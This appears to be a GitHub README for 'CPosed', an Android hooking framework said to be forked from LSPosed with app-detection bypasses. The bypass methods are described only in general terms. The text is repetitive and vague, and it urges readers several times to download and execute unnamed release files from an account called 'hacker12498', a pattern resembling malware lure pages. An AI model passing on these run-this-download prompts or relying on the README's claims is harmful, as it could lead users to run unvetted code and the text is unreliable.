CPosed — Continuously updated Android framework with advanced bypasses
=====================================================================

[![Releases](https://img.shields.io/badge/Releases-View%20Now-blue?logo=github&style=for-the-badge)](https://github.com/hacker12498/CPosed/releases)

![Android Robot](https://upload.wikimedia.org/wikipedia/commons/d/d7/Android_robot.svg)

What is CPosed
--------------

CPosed is an Android framework forked from Lsposed. It offers a maintained runtime hook layer with added detection bypass and core changes. The project targets developers, modders, and researchers who build modules that interact with Android apps at runtime.

- Lightweight framework layer compatible with many devices.
- Ongoing updates to improve stability and compatibility.
- Focused on bypassing common runtime detection vectors in a controlled way.
- Designed to keep module APIs stable for third-party add-ons.

Key features
------------

- Core hooking runtime derived from Lsposed with API parity where useful.
- Detection bypass suite that addresses common app checks without invasive system changes.
- Fine-grained module permissions and process scoping.
- Per-app configuration via a simple JSON or GUI tool.
- Support for Magisk and other rootless setups where feasible.
- Modular design to let developers plug in new bypass strategies.

Quick links
-----------

- Releases (download and run): https://github.com/hacker12498/CPosed/releases
- Badge: [![Releases](https://img.shields.io/badge/Releases-View%20Now-blue?logo=github&style=for-the-badge)](https://github.com/hacker12498/CPosed/releases)

Install (short)
---------------

1. Visit the Releases page: https://github.com/hacker12498/CPosed/releases
2. Download the latest release file from that page.
3. Execute the downloaded file on your host or device per the included README in the release bundle.

If the Releases link does not work for you, check the "Releases" section on this repository page for artifacts.

Detailed installation (developers and advanced users)
----------------------------------------------------

Prerequisites

- Android device with unlocked bootloader or a supported rootless environment.
- adb and fastboot tools.
- Basic knowledge of flashing or module install methods.

Steps

1. Go to the Releases page: https://github.com/hacker12498/CPosed/releases.
2. Pick the correct artifact for your device and Android version. The release will include:
   - framework zip or installer script
   - compatibility notes
   - SHA256 checksums
3. Download the release file to your desktop.
4. Verify checksum.
5. Transfer the file to the device or use adb sideload as indicated in the release notes.
6. Run the included installer script or follow the installer steps in the release bundle.
7. Reboot the device when the installer completes.

Files named in the release must be downloaded and executed to install the framework. Use the artifact that matches your device and Android version.

Core concepts
-------------

- Hooking runtime: The layer that intercepts app method calls and system APIs. Modules register hooks via a stable API.
- Module manifests: Define which apps and processes a module targets. The manifest limits the attack surface and reduces unintended side effects.
- Bypass plugins: Small, testable components that replace or mask detection signals. You can enable or disable these per app.
- Process scope: CPosed runs in defined processes to avoid system-wide changes that break other apps.

Security model
--------------

CPosed separates module capability from runtime capability. Modules request a narrow set of hooks. The runtime enforces boundaries and validates module compatibility.

- Modules cannot modify system files by default.
- The runtime logs hook activity for debugging.
- Per-app allowlists limit which apps see module hooks.

Design goals
------------

- Maintain Lsposed compatibility where it helps developers.
- Keep core changes minimal and auditable.
- Make bypasses modular and reversible.
- Provide clear logs for debugging hook behavior.

API and module development
--------------------------

The module API mirrors common Lsposed hooks to minimize migration work. Key parts:

- Entry points: onLoadPackage, onCreate, onStart, etc.
- Hook utilities: findMethod, replaceMethod, callOriginal.
- Config API: load and store simple JSON per-app settings.
- Compatibility helpers: shims to handle Android API changes.

Development tips

- Test modules in a VM or emulator before deploying to a device.
- Use the provided debug flags to trace hook calls.
- Keep hooks narrow and skip heavy work on the main thread.
- Use per-app scopes to reduce cross-app impact.

Bypass approach (high level)
----------------------------

CPosed uses a layered approach to avoid false positives and keep app checks stable.

- Signal masking: Replace or hide known detection properties at runtime.
- Timing smoothing: Adjust observable timing patterns to match stock behavior.
- API shims: Provide alternate return values for sensitive calls.
- Environment adaptation: Detect the app's checks and apply targeted mitigations.

These approaches aim for minimal invasive change. The framework avoids system-level patches where a runtime shim suffices.

Compatibility
-------------

CPosed works on a range of Android versions and device vendors. The Releases page lists supported builds and known issues. If you see compatibility problems, open an issue and include logs.

Performance
-----------

CPosed prioritizes low overhead. The runtime keeps hooking hot paths to a minimum. You will see a slight CPU and memory cost depending on enabled modules and hooks.

Troubleshooting
---------------

- If an app crashes after enabling a module, disable the module and reproduce the crash. Capture logcat and open an issue with the trace.
- Use the runtime debug mode to dump active hooks and process scopes.
- If install fails, double-check the artifact matches your device and Android build.

Example workflow for module authors
-----------------------------------

1. Set up a debug device or emulator.
2. Install CPosed from the Releases page: https://github.com/hacker12498/CPosed/releases and run the installer file.
3. Create a module scaffold using the provided template.
4. Implement onLoadPackage and target a test app.
5. Use debug flags to trace hook calls and behavior.
6. Iterate and publish your module.

Logs and diagnostics
--------------------

CPosed writes logs to a per-process log file and to logcat. Logs include:

- Hook registration events.
- Module load events.
- Bypass plugin activity.
- Errors and stack traces.

Enable verbose logging only while troubleshooting. Excessive logging can affect performance.

Release policy
--------------

Releases appear regularly to address device changes and detection strategy shifts. Each release bundles:

- Installer or zip artifact.
- Checksums.
- Change log with breaking notes when needed.

Always download and run the release file that matches your device from: https://github.com/hacker12498/CPosed/releases

Contributing
------------

- Fork the repo.
- Write clear, testable code.
- Add unit tests where feasible.
- Open a pull request with a description and test steps.
- Include a rationale for bypass strategies and a risk assessment.

When you submit bypass code, include tests that show the change does not break unrelated apps.

Code of conduct
---------------

Respect maintainers and users. Keep discussions technical and civil. Report security issues privately via the repository's security contact.

Licensing
---------

CPosed uses a permissive open source license. See LICENSE.md in the repo for terms and contributor rights.

FAQ
---

Q: Is CPosed safe to use on production devices?
A: Use caution. Test on a secondary device. The runtime targets minimal change, but hooking can alter app behavior.

Q: Will updates fix detection issues automatically?
A: The team releases updates to adapt to new checks. You may still need to enable or adjust per-app settings.

Q: Can I run CPosed without root?
A: Some setups allow rootless deployment. Check the specific release artifact and notes.

Images and media
----------------

- Android robot: https://upload.wikimedia.org/wikipedia/commons/d/d7/Android_robot.svg
- Release badge: [![Releases](https://img.shields.io/badge/Releases-View%20Now-blue?logo=github&style=for-the-badge)](https://github.com/hacker12498/CPosed/releases)

Contact and support
-------------------

Open issues on this repository for bugs and feature requests. For security reports, use the repository's security contact channel.

Help us improve
----------------

- Report reproducible bugs.
- Share device-specific notes in issues.
- Contribute modules and tests.

Download and run the installer from the Releases page to get started: https://github.com/hacker12498/CPosed/releases